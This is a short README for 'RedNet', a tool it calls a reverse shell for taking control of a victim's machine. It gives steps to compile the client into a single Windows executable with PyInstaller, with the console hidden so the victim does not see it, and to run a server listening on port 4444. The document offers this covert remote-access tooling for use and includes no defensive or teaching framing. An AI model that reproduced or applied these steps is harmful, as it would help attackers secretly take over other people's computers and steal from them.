# **RedNet**

### A reverse shell in which you can take control of the victim's machine.

## Transforming py to exe

### If python is installed, on console, write
- ``` pip install pyinstaller ``` **or** ``` python -m pip install pyinstaller ``` **| Its install the pyinstaller**
- ``` pyinstaller --onefile --windowed client.py ``` 
> --onefile | **Generate a single file**

> --windowed | **Hide the console**

## Listen port 4444
- ``` python server.py ``` **on 'IP:' write 0.0.0.0 and on 'PORT:' the port to listen ex: 4444**

> Is under development
